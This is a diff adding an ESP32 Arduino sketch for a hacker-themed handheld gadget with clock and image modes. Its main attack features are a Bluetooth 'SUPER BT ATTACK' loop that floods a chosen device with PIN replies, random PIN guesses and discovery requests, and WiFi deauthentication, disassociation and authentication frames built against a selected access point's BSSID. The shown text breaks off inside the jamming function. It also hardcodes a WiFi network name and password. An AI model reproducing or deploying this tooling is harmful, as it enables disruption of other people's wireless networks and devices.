@@ -1,0 +1,2946 @@
+#include <Arduino.h>
+#include <TFT_eSPI.h>
+#include <SPI.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <SPIFFS.h>
+#include <FS.h>
+#include <TJpg_Decoder.h>
+#include <time.h>
+#include "esp_wifi.h"
+#include "WiFiScan.h"
+#include "esp_bt.h"
+#include "esp_bt_main.h"
+#include "esp_bt_device.h"
+#include "esp_gap_bt_api.h"
+#include "esp_bt_defs.h"
+#include "esp_system.h"
+#include "esp_task_wdt.h"
+#include "soc/rtc_wdt.h"
+#include "esp32-hal-timer.h"
+
+#define AVRCP_PROFILE 0x110B
+#define A2DP_PROFILE 0x110D
+#define ATTACK_PACKET_SIZE 600
+#define FLOOD_DELAY 2
+#define ATTACK_INTENSITY 50
+#define CONFIG_BT_BLE_DYNAMIC_ENV_MEMORY
+#define CONFIG_BT_BTU_TASK_STACK_SIZE 4096
+// تعریف متغیرهای جدید
+bool isJamming = false;
+bool showNetworks = true;
+int selectedNetwork = 0;
+uint16_t numNetworks = 0; // تغییر به uint16_t
+wifi_ap_record_t networks[20];
+
+const char *ssid = "MobilePaytakht";
+const char *password = "soheil224224p@yt@kht";
+
+const char *ntpServer = "pool.ntp.org";
+const long gmtOffset_sec = 12600;
+const int daylightOffset_sec = 0;
+
+TFT_eSPI tft = TFT_eSPI();
+
+const int BUTTON_UP = 12;
+const int BUTTON_DOWN = 13;
+const int BUTTON_SELECT = 14;
+
+#define MENU_BG TFT_BLACK
+#define MENU_FG TFT_GREEN
+#define SELECTED_BG 0x0280
+#define HIGHLIGHT_COLOR 0x07E0
+#define MATRIX_COLOR 0x0320
+#define DIM_GREEN 0x0200
+#define SEGMENT_ON 0x07E0
+#define SEGMENT_OFF 0x0280
+
+// JPEG Display variables
+#define DISPLAY_WIDTH 240
+#define DISPLAY_HEIGHT 240
+#define MAX_UPLOAD_SIZE 64 * 1024
+#define MAX_FILES 5
+
+#define ERROR_COLOR 0xF800
+// تعاریف بلوتوث
+#define MAX_BT_DEVICES 20
+
+struct BTDevice
+{
+    esp_bd_addr_t addr;
+    char name[32];
+    int8_t rssi;
+    bool isVulnerable; // برای نشان دادن آسیب‌پذیری
+    uint32_t lastSeen; // آخرین زمان مشاهده
+};
+
+BTDevice btDevices[MAX_BT_DEVICES];
+int numBTDevices = 0;
+int selectedBTDevice = 0;
+bool isBTJamming = false;
+bool showBTDevices = true;
+
+WebServer server(80);
+String uploadedFiles[MAX_FILES];
+int currentFileIndex = 0;
+bool inMemeMode = false; // Flag to track if we're in MEME mode
+// اضافه کردن به تعاریف اولیه کنار MenuState فعلی
+enum MenuState
+{
+    MAIN_MENU,
+    CLOCK_MENU,
+    CLOCK_DISPLAY,
+    JUMPERS_MENU // اضافه شده
+};
+
+// منوی جدید Jumpers
+const int JUMPERS_MENU_ITEMS = 3;
+String jumpersMenuItems[JUMPERS_MENU_ITEMS] = {
+    "> WIFI JUMP",
+    "> BT JUMP",
+    "> BACK"};
+int currentJumpersSelection = 0;
+
+const int MAIN_MENU_ITEMS = 5;
+String mainMenuItems[MAIN_MENU_ITEMS] = {
+    "> CLOCK",
+    "> MEME IMAGE",
+    "> JUMPERS ",
+    "> RF KILLER",
+    "> COPY RF"};
+
+const int CLOCK_MENU_ITEMS = 6;
+String clockMenuItems[CLOCK_MENU_ITEMS] = {
+    "> DIGITAL_24H",
+    "> MATRIX_CLOCK",
+    "> ANALOG_BASIC",
+    "> ANALOG_MODERN",
+    "> SKULL_HACK",
+    "> BACK_TO_MENU"};
+
+struct Drop
+{
+    int x, y;
+    int speed;
+    char character;
+    bool active;
+};
+const int MAX_DROPS = 30;
+Drop matrixDrops[MAX_DROPS];
+
+MenuState currentMenu = MAIN_MENU;
+int currentClockType = 0;
+int currentMainSelection = 0;
+int currentClockSelection = 0;
+bool needRedraw = true;
+bool timeInitialized = false;
+String currentDateTime = "";
+const char *g_username = "NimaDalir";
+const char *g_current_utc = "2025-05-27 00:20:41";
+// اعلان توابع
+void drawHexBackground();
+void drawSystemInfo(String menuTitle);
+void drawMenuItem(int index, bool selected, String menuItem, int totalItems);
+void displayNetworks();
+void startJamming(uint8_t channel);
+void startBTJump();
+
+// انیمیشن ورود به حمله
+void showAttackAnimation()
+{
+    tft.fillScreen(TFT_BLACK);
+
+    // انیمیشن دایره‌ای
+    for (int r = 0; r < 120; r += 10)
+    {
+        tft.drawCircle(120, 120, r, 0xF800);
+        delay(50);
+    }
+
+    // انیمیشن متن
+    const char *text = "INITIALIZING";
+    tft.setTextSize(2);
+    int x = 60;
+    for (int i = 0; i < strlen(text); i++)
+    {
+        for (int y = 240; y > 100; y -= 10)
+        {
+            tft.fillRect(x + i * 12, y - 20, 12, 30, TFT_BLACK);
+            tft.setCursor(x + i * 12, y);
+            tft.setTextColor(0xF800);
+            tft.print(text[i]);
+            delay(10);
+        }
+    }
+
+    // انیمیشن فلش
+    for (int i = 0; i < 3; i++)
+    {
+        tft.fillScreen(0xF800);
+        delay(100);
+        tft.fillScreen(TFT_BLACK);
+        delay(100);
+    }
+}
+
+void bt_gap_callback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param)
+{
+    switch (event)
+    {
+    case ESP_BT_GAP_DISC_RES_EVT:
+    {
+        if (numBTDevices >= MAX_BT_DEVICES)
+            return;
+
+        // بررسی دستگاه تکراری
+        int existingIdx = -1;
+        for (int i = 0; i < numBTDevices; i++)
+        {
+            if (memcmp(param->disc_res.bda, btDevices[i].addr, ESP_BD_ADDR_LEN) == 0)
+            {
+                existingIdx = i;
+                break;
+            }
+        }
+
+        int deviceIdx = (existingIdx >= 0) ? existingIdx : numBTDevices;
+
+        // ذخیره آدرس
+        memcpy(btDevices[deviceIdx].addr, param->disc_res.bda, ESP_BD_ADDR_LEN);
+
+        // پردازش اطلاعات دستگاه
+        bool nameFound = false;
+        for (int i = 0; i < param->disc_res.num_prop; i++)
+        {
+            esp_bt_gap_dev_prop_t *prop = &param->disc_res.prop[i];
+
+            switch (prop->type)
+            {
+            case ESP_BT_GAP_DEV_PROP_BDNAME:
+            {
+                if (prop->val != NULL && prop->len > 0)
+                {
+                    memset(btDevices[deviceIdx].name, 0, 32);
+                    memcpy(btDevices[deviceIdx].name, prop->val,
+                           (prop->len < 31) ? prop->len : 31);
+                    nameFound = true;
+                    Serial.printf("Found name: %s\n", btDevices[deviceIdx].name);
+                }
+                break;
+            }
+
+            case ESP_BT_GAP_DEV_PROP_RSSI:
+                btDevices[deviceIdx].rssi = *((int8_t *)prop->val);
+                break;
+            }
+        }
+
+        // اگر نام پیدا نشد، درخواست مستقیم نام
+        if (!nameFound)
+        {
+            // درخواست نام با EIR
+            esp_bt_gap_read_remote_name(param->disc_res.bda);
+
+            // نام موقت
+            sprintf(btDevices[deviceIdx].name, "Device_%02X%02X",
+                    param->disc_res.bda[4], param->disc_res.bda[5]);
+        }
+
+        if (existingIdx < 0)
+        {
+            numBTDevices++;
+        }
+        break;
+    }
+
+    case ESP_BT_GAP_READ_REMOTE_NAME_EVT:
+        if (param->read_rmt_name.stat == ESP_BT_STATUS_SUCCESS)
+        {
+            for (int i = 0; i < numBTDevices; i++)
+            {
+                if (memcmp(param->read_rmt_name.bda, btDevices[i].addr, ESP_BD_ADDR_LEN) == 0)
+                {
+                    strncpy(btDevices[i].name, (char *)param->read_rmt_name.rmt_name, 31);
+                    btDevices[i].name[31] = '\0';
+                    Serial.printf("Updated name: %s\n", btDevices[i].name);
+                    break;
+                }
+            }
+        }
+        break;
+
+    case ESP_BT_GAP_AUTH_CMPL_EVT:
+        if (param->auth_cmpl.stat == ESP_BT_STATUS_SUCCESS)
+        {
+            Serial.println("Auth success!");
+        }
+        break;
+    }
+}
+
+void displayBTDevices()
+{
+    static unsigned long lastUpdate = 0;
+    if (millis() - lastUpdate < 300)
+        return;
+    lastUpdate = millis();
+
+    tft.fillScreen(TFT_BLACK);
+
+    // نمایش هدر
+    tft.fillRect(0, 0, 240, 30, SELECTED_BG);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setTextSize(2);
+    tft.setCursor(10, 8);
+    tft.printf("BT Devices: %d", numBTDevices);
+
+    // نمایش دستگاه‌ها
+    int startIdx = (selectedBTDevice / 3) * 3;
+    int endIdx = min(startIdx + 3, numBTDevices);
+
+    for (int i = startIdx; i < endIdx; i++)
+    {
+        int yPos = 35 + ((i - startIdx) * 65);
+
+        if (i == selectedBTDevice)
+        {
+            tft.fillRoundRect(5, yPos, 230, 60, 8, SELECTED_BG);
+        }
+        else
+        {
+            tft.drawRoundRect(5, yPos, 230, 60, 8, DIM_GREEN);
+        }
+
+        tft.setTextColor(i == selectedBTDevice ? HIGHLIGHT_COLOR : DIM_GREEN);
+        tft.setTextSize(2);
+        tft.setCursor(15, yPos + 5);
+
+        char truncName[16];
+        strncpy(truncName, btDevices[i].name, 15);
+        truncName[15] = '\0';
+        if (strlen(btDevices[i].name) > 15)
+        {
+            strcat(truncName, "...");
+        }
+        tft.print(truncName);
+
+        tft.setTextSize(1);
+        tft.setCursor(15, yPos + 35);
+        tft.printf("%02X:%02X:%02X  RSSI:%d",
+                   btDevices[i].addr[0],
+                   btDevices[i].addr[1],
+                   btDevices[i].addr[2],
+                   btDevices[i].rssi);
+    }
+
+    tft.setTextColor(DIM_GREEN);
+    tft.setTextSize(1);
+    tft.setCursor(10, 220);
+    tft.print("UP/DOWN: Select  SELECT: Attack");
+}
+
+void startBTAttack(int deviceIndex) {
+    if (deviceIndex >= numBTDevices) return;
+
+    showAttackAnimation();
+
+    tft.fillScreen(TFT_BLACK);
+    tft.setTextColor(0x07E0);
+    tft.setTextSize(2);
+
+    // هدر انیمیشنی
+    for(int i = 0; i <= 240; i += 8) {
+        tft.fillRect(0, 0, i, 30, 0x0841);
+        delay(5);
+    }
+    tft.setCursor(50, 8);
+    tft.print("SUPER BT ATTACK");
+
+    unsigned long startTime = millis();
+    unsigned long packets = 0;
+    int currentMode = 0;
+    const int NUM_MODES = 7;
+    
+    esp_bd_addr_t target;
+    memcpy(target, btDevices[deviceIndex].addr, ESP_BD_ADDR_LEN);
+
+    // آماده‌سازی پکت‌های تصادفی
+    uint8_t* attackPackets[10];
+    for(int i = 0; i < 10; i++) {
+        attackPackets[i] = new uint8_t[ATTACK_PACKET_SIZE];
+        for(int j = 0; j < ATTACK_PACKET_SIZE; j++) {
+            attackPackets[i][j] = random(256);
+        }
+    }
+
+    while(isBTJamming) {
+        for(int i = 0; i < ATTACK_INTENSITY; i++) {
+            switch(currentMode) {
+                case 0: // RAPID CONNECT
+                    for(int j = 0; j < 10; j++) {
+                        esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
+                        esp_bt_gap_pin_reply(target, true, 4, attackPackets[j]);
+                        delay(FLOOD_DELAY);
+                        esp_bt_gap_set_scan_mode(ESP_BT_NON_CONNECTABLE, ESP_BT_NON_DISCOVERABLE);
+                    }
+                    break;
+
+                case 1: // SCAN FLOOD
+                    for(int j = 0; j < 15; j++) {
+                        esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 1, 0);
+                        delay(FLOOD_DELAY);
+                        esp_bt_gap_cancel_discovery();
+                    }
+                    break;
+
+                case 2: // PIN BRUTEFORCE
+                    for(int j = 0; j < 20; j++) {
+                        uint8_t pin[4] = {(uint8_t)random(10), (uint8_t)random(10),
+                                        (uint8_t)random(10), (uint8_t)random(10)};
+                        esp_bt_gap_pin_reply(target, true, 4, pin);
+                        delay(FLOOD_DELAY);
+                    }
+                    break;
+
+                case 3: // AGGRESSIVE MODE
+                    for(int j = 0; j < 8; j++) {
+                        esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
+                        esp_bt_gap_pin_reply(target, true, ATTACK_PACKET_SIZE, attackPackets[j % 10]);
+                        esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 1, 0);
+                        delay(1);
+                    }
+                    break;
+
+                case 4: // CHAOS MODE
+                    for(int j = 0; j < 12; j++) {
+                        esp_bt_gap_set_scan_mode(
+                            random(2) ? ESP_BT_CONNECTABLE : ESP_BT_NON_CONNECTABLE,
+                            random(2) ? ESP_BT_GENERAL_DISCOVERABLE : ESP_BT_NON_DISCOVERABLE
+                        );
+                        esp_bt_gap_pin_reply(target, true, 4, attackPackets[j % 10]);
+                        delay(FLOOD_DELAY);
+                    }
+                    break;
+
+                case 5: // HYBRID ATTACK
+                    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
+                    for(int j = 0; j < 5; j++) {
+                        esp_bt_gap_pin_reply(target, true, 4, attackPackets[j]);
+                        esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 1, 0);
+                        delay(FLOOD_DELAY);
+                        esp_bt_gap_cancel_discovery();
+                    }
+                    break;
+
+                case 6: // ULTIMATE
+                    for(int j = 0; j < 30; j++) {
+                        esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
+                        esp_bt_gap_pin_reply(target, true, 4, attackPackets[j % 10]);
+                        esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 1, 0);
+                        delay(1);
+                        esp_bt_gap_cancel_discovery();
+                        esp_bt_gap_set_scan_mode(ESP_BT_NON_CONNECTABLE, ESP_BT_NON_DISCOVERABLE);
+                    }
+                    break;
+            }
+            packets += 50;
+        }
+
+        // تغییر مود با انیمیشن
+        if((millis() - startTime) % 4000 == 0) {
+            int prevMode = currentMode;
+            currentMode = (currentMode + 1) % NUM_MODES;
+            
+            // انیمیشن تغییر مود
+            for(int i = 0; i < 220; i += 10) {
+                tft.fillRect(10 + i, 80, 10, 30, ((i/10) % 2) ? 0xF800 : 0xFFE0);
+                delay(5);
+            }
+        }
+
+        const char* modeNames[] = {
+            "RAPID CONN",
+            "SCAN FLOOD",
+            "PIN CRACK",
+            "AGGRESSIVE",
+            "CHAOS MODE",
+            "HYBRID ATK",
+            "ULTIMATE"
+        };
+
+        // نمایش وضعیت با افکت‌های ویژه
+        tft.fillRect(0, 70, 240, 50, TFT_BLACK);
+        tft.setTextSize(2);
+        uint16_t pulseColor = ((millis() / 100) % 2) ? 0xF800 : 0xFFE0;
+        tft.setTextColor(pulseColor);
+        tft.setCursor(10, 80);
+        tft.print(modeNames[currentMode]);
+
+        // نوار پیشرفت با گرادیان رنگی
+        static int lastProgress = 0;
+        int progress = ((millis() - startTime) / 40) % 100;
+
+        if(progress != lastProgress) {
+            tft.fillRect(10, 190, 220, 20, TFT_BLACK);
+            tft.drawRect(10, 190, 220, 20, 0x07E0);
+            
+            for(int i = 0; i < progress * 2.2; i++) {
+                uint16_t color;
+                if(i < 73) color = 0x07E0;        // سبز
+                else if(i < 146) color = 0xFFE0;  // زرد
+                else color = 0xF800;              // قرمز
+                tft.drawFastVLine(12 + i, 192, 16, color);
+            }
+            lastProgress = progress;
+        }
+
+        // نمایش آمار با افکت چشمک‌زن
+        tft.setTextSize(1);
+        tft.fillRect(10, 130, 220, 50, TFT_BLACK);
+        tft.setTextColor(((millis() / 200) % 2) ? 0xFFE0 : 0x07E0);
+        tft.setCursor(10, 130);
+        tft.printf("Packets: %lu", packets);
+        tft.setCursor(10, 150);
+        float pps = packets * 1000.0f / (millis() - startTime);
+        tft.printf("PPS: %.1f", pps);
+
+        // بررسی دکمه خروج
+        if (digitalRead(BUTTON_SELECT) == LOW) {
+            delay(100);
+            if (digitalRead(BUTTON_SELECT) == LOW) {
+                // انیمیشن خروج
+                for(int i = 0; i < 240; i += 4) {
+                    tft.drawFastVLine(i, 0, 240, 0xF800);
+                    delay(2);
+                }
+                break;
+            }
+        }
+
+        delay(2);
+        yield();
+    }
+
+    // پاکسازی حافظه
+    for(int i = 0; i < 10; i++) {
+        delete[] attackPackets[i];
+    }
+}
+
+void startBTJump()
+{
+    Serial.println("Starting BT Jump...");
+
+    // غیرفعال کردن WiFi
+    WiFi.disconnect(true);
+    WiFi.mode(WIFI_OFF);
+    btStop();
+    delay(100);
+
+    // آزادسازی حافظه
+    if (esp_bt_controller_mem_release(ESP_BT_MODE_BLE) != ESP_OK)
+    {
+        Serial.println("Failed to release BLE memory");
+    }
+    delay(100);
+
+    // تنظیمات کنترلر با حافظه کمتر
+    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+    bt_cfg.mode = ESP_BT_MODE_CLASSIC_BT;
+    bt_cfg.bt_max_acl_conn = 1;
+    bt_cfg.bt_max_sync_conn = 1;
+
+    // راه‌اندازی با مدیریت خطا
+    esp_err_t ret;
+    bool initSuccess = true;
+
+    ret = esp_bt_controller_init(&bt_cfg);
+    if (ret != ESP_OK)
+    {
+        Serial.printf("BT controller init failed: %d\n", ret);
+        initSuccess = false;
+    }
+    delay(100);
+
+    if (initSuccess)
+    {
+        ret = esp_bt_controller_enable(ESP_BT_MODE_CLASSIC_BT);
+        if (ret != ESP_OK)
+        {
+            Serial.println("BT controller enable failed");
+            initSuccess = false;
+        }
+    }
+    delay(100);
+
+    if (initSuccess)
+    {
+        ret = esp_bluedroid_init();
+        if (ret != ESP_OK)
+        {
+            Serial.println("Bluedroid init failed");
+            initSuccess = false;
+        }
+    }
+    delay(100);
+
+    if (initSuccess)
+    {
+        ret = esp_bluedroid_enable();
+        if (ret != ESP_OK)
+        {
+            Serial.println("Bluedroid enable failed");
+            initSuccess = false;
+        }
+    }
+
+    if (!initSuccess)
+    {
+        tft.fillScreen(TFT_BLACK);
+        tft.setTextColor(ERROR_COLOR);
+        tft.setTextSize(2);
+        tft.setCursor(20, 100);
+        tft.println("BT INIT FAILED!");
+        delay(2000);
+        return;
+    }
+
+    // پاکسازی لیست و متغیرها
+    numBTDevices = 0;
+    selectedBTDevice = 0;
+    showBTDevices = true;
+
+    // ثبت کالبک
+    esp_bt_gap_register_callback(bt_gap_callback);
+    delay(100);
+
+    // شروع اسکن با تنظیمات جدید
+    esp_bt_gap_set_scan_mode(ESP_BT_CONNECTABLE, ESP_BT_GENERAL_DISCOVERABLE);
+
+    // پارامترهای اسکن بهینه
+    esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 15, 0);
+
+    unsigned long lastScanUpdate = millis();
+    unsigned long lastUIUpdate = 0;
+    bool isScanning = true;
+
+    while (isScanning)
+    {
+        // ریست watchdog
+        esp_task_wdt_reset();
+
+        // به‌روزرسانی UI با نرخ محدود
+        if (millis() - lastUIUpdate > 500)
+        {
+            lastUIUpdate = millis();
+            if (showBTDevices && numBTDevices > 0)
+            {
+                displayBTDevices();
+            }
+        }
+
+        // راه‌اندازی مجدد اسکن هر 30 ثانیه
+        if (millis() - lastScanUpdate > 30000)
+        {
+            esp_bt_gap_cancel_discovery();
+            delay(100);
+            esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 15, 0);
+            lastScanUpdate = millis();
+        }
+
+        // مدیریت دکمه‌ها
+        if (digitalRead(BUTTON_UP) == LOW)
+        {
+            delay(50);
+            if (selectedBTDevice > 0)
+            {
+                selectedBTDevice--;
+                displayBTDevices();
+                delay(200);
+            }
+        }
+
+        if (digitalRead(BUTTON_DOWN) == LOW)
+        {
+            delay(50);
+            if (selectedBTDevice < numBTDevices - 1)
+            {
+                selectedBTDevice++;
+                displayBTDevices();
+                delay(200);
+            }
+        }
+
+        if (digitalRead(BUTTON_SELECT) == LOW)
+        {
+            delay(50);
+            if (!isBTJamming && numBTDevices > 0)
+            {
+                isBTJamming = true;
+                showBTDevices = false;
+                startBTAttack(selectedBTDevice);
+            }
+            else
+            {
+                isBTJamming = false;
+                showBTDevices = true;
+                numBTDevices = 0;
+                esp_bt_gap_start_discovery(ESP_BT_INQ_MODE_GENERAL_INQUIRY, 15, 0);
+            }
+            delay(200);
+        }
+
+        // خروج با نگه داشتن دکمه
+        if (digitalRead(BUTTON_SELECT) == LOW && !isBTJamming)
+        {
+            delay(500);
+            if (digitalRead(BUTTON_SELECT) == LOW)
+            {
+                isScanning = false;
+            }
+        }
+
+        delay(10);
+        yield();
+    }
+
+    // پاکسازی بلوتوث
+    esp_bt_gap_cancel_discovery();
+    esp_bluedroid_disable();
+    esp_bluedroid_deinit();
+    esp_bt_controller_disable();
+    esp_bt_controller_deinit();
+
+    currentMenu = JUMPERS_MENU;
+    needRedraw = true;
+}
+
+void displayNetworks()
+{
+    tft.fillScreen(MENU_BG);
+    int centerX = 120;
+
+    // نمایش شماره صفحه
+    int totalPages = (numNetworks + 2) / 3;
+    int currentPage = selectedNetwork / 3;
+    tft.setTextColor(DIM_GREEN);
+    tft.setCursor(centerX - 30, 15);
+    tft.printf("Page %d/%d", currentPage + 1, totalPages);
+
+    // نمایش شبکه‌ها
+    int startIdx = currentPage * 3;
+    // رفع مشکل min با استفاده از روش ساده‌تر
+    int endIdx = startIdx + 3;
+    if (static_cast<uint16_t>(endIdx) > numNetworks)
+    {
+        endIdx = numNetworks;
+    }
+
+    for (int i = startIdx; i < endIdx; i++)
+    {
+        int yPos = 60 + ((i - startIdx) * 60);
+
+        if (i == selectedNetwork)
+        {
+            tft.fillRoundRect(20, yPos - 5, 200, 50, 10, SELECTED_BG);
+            tft.setTextColor(HIGHLIGHT_COLOR);
+        }
+        else
+        {
+            tft.drawRoundRect(20, yPos - 5, 200, 50, 10, DIM_GREEN);
+            tft.setTextColor(DIM_GREEN);
+        }
+
+        tft.setTextSize(2);
+        tft.setCursor(30, yPos);
+        tft.print((char *)networks[i].ssid);
+
+        tft.setTextSize(1);
+        tft.setCursor(30, yPos + 25);
+        tft.printf("CH:%d RSSI:%d", networks[i].primary, networks[i].rssi);
+
+        // نمایش قدرت سیگنال
+        int signalStrength = map(networks[i].rssi, -100, -40, 0, 4);
+        for (int j = 0; j < 4; j++)
+        {
+            if (j < signalStrength)
+            {
+                tft.fillRect(150 + (j * 12), yPos + 25, 8, 10, HIGHLIGHT_COLOR);
+            }
+            else
+            {
+                tft.drawRect(150 + (j * 12), yPos + 25, 8, 10, DIM_GREEN);
+            }
+        }
+    }
+
+    // راهنمای دکمه‌ها
+    tft.setTextColor(DIM_GREEN);
+    tft.setTextSize(1);
+    tft.setCursor(10, 220);
+    tft.print("UP/DOWN:Move  SELECT:Attack/Back");
+}
+
+void drawJumpersMenu()
+{
+    if (!needRedraw)
+        return;
+    tft.fillScreen(MENU_BG);
+    drawHexBackground();
+
+    // هدر با فاصله مناسب
+    tft.fillRect(0, 0, 240, 35, SELECTED_BG);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setTextSize(2);
+    tft.setCursor(50, 10);
+    tft.print("JUMPERS MENU");
+
+    // منو با فاصله بیشتر از هدر
+    for (int i = 0; i < JUMPERS_MENU_ITEMS; i++)
+    {
+        // افزایش فاصله عمودی از بالا با تغییر 45 به 65
+        int yPos = 65 + (i * 35);
+        drawMenuItem(i, i == currentJumpersSelection, jumpersMenuItems[i], JUMPERS_MENU_ITEMS);
+    }
+    needRedraw = false;
+}
+
+void gregorianToJalali(int gregorianYear, int gregorianMonth, int gregorianDay,
+                       int *jalaliYear, int *jalaliMonth, int *jalaliDay)
+{
+    int gy, gm, gd;
+    int jy, jm, jd;
+    int g_day_no, j_day_no;
+    int leap;
+    int i;
+
+    int g_days_in_month[12] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};
+    int j_days_in_month[12] = {31, 31, 31, 31, 31, 31, 30, 30, 30, 30, 30, 29};
+
+    gy = gregorianYear - 1600;
+    gm = gregorianMonth - 1;
+    gd = gregorianDay - 1;
+
+    g_day_no = 365 * gy + (gy + 3) / 4 - (gy + 99) / 100 + (gy + 399) / 400;
+    for (i = 0; i < gm; ++i)
+        g_day_no += g_days_in_month[i];
+    if (gm > 1 && ((gy % 4 == 0 && gy % 100 != 0) || (gy % 400 == 0)))
+        ++g_day_no;
+    g_day_no += gd;
+
+    j_day_no = g_day_no - 79;
+    j_day_no = j_day_no - 1;
+
+    jy = 33 * (j_day_no / 12053);
+    j_day_no %= 12053;
+    jy += 4 * (j_day_no / 1461);
+    j_day_no %= 1461;
+
+    if (j_day_no >= 366)
+    {
+        jy += (j_day_no - 1) / 365;
+        j_day_no = (j_day_no - 1) % 365;
+    }
+
+    for (i = 0; i < 11 && j_day_no >= j_days_in_month[i]; ++i)
+    {
+        j_day_no -= j_days_in_month[i];
+    }
+    jm = i + 1;
+    jd = j_day_no + 1;
+
+    *jalaliYear = jy + 979;
+    *jalaliMonth = jm;
+    *jalaliDay = jd;
+}
+
+void scanNetworks()
+{
+    tft.fillScreen(MENU_BG);
+    tft.setTextColor(HIGHLIGHT_COLOR);
+    tft.setTextSize(1);
+    tft.setCursor(10, 10);
+    tft.print("Scanning WiFi Networks...");
+
+    // قطع اتصال فعلی و تنظیم مد
+    WiFi.disconnect(true); // disconnect و پاک کردن تنظیمات
+    WiFi.mode(WIFI_STA);   // تنظیم مد به STA
+    delay(100);            // صبر برای اعمال تغییرات
+
+    // شروع اسکن
+    int foundNetworks = WiFi.scanNetworks(false, true, false, 300); // اسکن غیر بلاکینگ، شامل شبکه‌های مخفی
+
+    // نمایش تعداد شبکه‌های پیدا شده
+    tft.fillScreen(MENU_BG);
+    tft.setCursor(10, 10);
+    tft.printf("Found %d networks", foundNetworks);
+    delay(1000);
+
+    if (foundNetworks > 0)
+    {
+        numNetworks = (foundNetworks > 20) ? 20 : foundNetworks;
+
+        // کپی اطلاعات شبکه‌ها
+        for (int i = 0; i < numNetworks; i++)
+        {
+            strlcpy((char *)networks[i].ssid, WiFi.SSID(i).c_str(), sizeof(networks[i].ssid));
+            networks[i].primary = WiFi.channel(i);
+            networks[i].rssi = WiFi.RSSI(i);
+        }
+
+        // نمایش برای دیباگ
+        tft.fillScreen(MENU_BG);
+        for (int i = 0; i < numNetworks && i < 4; i++)
+        {
+            tft.setCursor(10, 30 + (i * 20));
+            tft.printf("%s (CH:%d)", networks[i].ssid, networks[i].primary);
+        }
+        delay(1000);
+    }
+    else
+    {
+        tft.setCursor(10, 30);
+        tft.print("No networks found!");
+        delay(2000);
+    }
+}
+
+void startJamming(uint8_t channel)
+{
+    WiFi.disconnect(true);
+    delay(100);
+
+    String targetSSID = (char *)networks[selectedNetwork].ssid;
+    uint8_t *bssid = networks[selectedNetwork].bssid;
+    int targetRSSI = networks[selectedNetwork].rssi;
+
+    WiFi.mode(WIFI_OFF);
+    delay(50);
+
+    // تنظیمات WiFi
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    cfg.nvs_enable = 0;
+    cfg.wifi_task_core_id = 0;
+    esp_wifi_init(&cfg);
+    esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    esp_wifi_set_mode(WIFI_MODE_APSTA);
+    esp_wifi_start();
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+    // انیمیشن شروع سایبرپانک
+    tft.fillScreen(TFT_BLACK);
+    static uint8_t matrix[40][30];
+
+    // راه‌اندازی ماتریس با کاراکترهای سایبری
+    for (int x = 0; x < 40; x++)
+    {
+        for (int y = 0; y < 30; y++)
+        {
+            matrix[x][y] = random(2);
+        }
+    }
+
+    // انیمیشن ماتریکس پیشرفته
+    for (int frame = 0; frame < 40; frame++)
+    {
+        for (int x = 0; x < 40; x++)
+        {
+            for (int y = 0; y < 30; y++)
+            {
+                if (matrix[x][y])
+                {
+                    uint16_t color = 0x0400 + (frame < 20 ? frame * 0x0020 : (40 - frame) * 0x0020);
+                    tft.drawPixel(x * 6, y * 8, color);
+                    if (random(100) < 30)
+                    {
+                        tft.setTextColor(color);
+                        tft.setCursor(x * 6, y * 8);
+                        tft.print(char(random(33, 126)));
+                    }
+                }
+            }
+        }
+        for (int x = 0; x < 40; x++)
+        {
+            for (int y = 28; y >= 0; y--)
+            {
+                matrix[x][y + 1] = matrix[x][y];
+            }
+            matrix[x][0] = random(2);
+        }
+        delay(20);
+    }
+
+    // پکت‌های حمله
+    uint8_t deauthPacket[26] = {
+        0xC0, 0x00, 0x00, 0x00,             // deauth frame
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination
+        bssid[0], bssid[1], bssid[2],       // source (AP)
+        bssid[3], bssid[4], bssid[5],
+        bssid[0], bssid[1], bssid[2], // BSSID
+        bssid[3], bssid[4], bssid[5],
+        0x00, 0x00, // sequence
+        0x01, 0x00  // reason
+    };
+
+    uint8_t disassocPacket[26] = {
+        0xA0, 0x00, 0x00, 0x00,             // disassoc frame
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // destination
+        bssid[0], bssid[1], bssid[2],       // source (AP)
+        bssid[3], bssid[4], bssid[5],
+        bssid[0], bssid[1], bssid[2], // BSSID
+        bssid[3], bssid[4], bssid[5],
+        0x00, 0x00, // sequence
+        0x02, 0x00  // reason
+    };
+
+    uint8_t authPacket[32] = {
+        0xB0, 0x00,                         // Auth frame
+        0x00, 0x00,                         // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
+        bssid[0], bssid[1], bssid[2],       // Source
+        bssid[3], bssid[4], bssid[5],
+        bssid[0], bssid[1], bssid[2], // BSSID
+        bssid[3], bssid[4], bssid[5],
+        0x00, 0x00, // Sequence
+        0x00, 0x00, // Auth algorithm
+        0x01, 0x00, // Auth sequence
+        0x00, 0x00  // Status code
+    };
+
+    // متغیرهای آماری
+    unsigned long startTime = millis();
+    unsigned long lastChannelHop = millis();
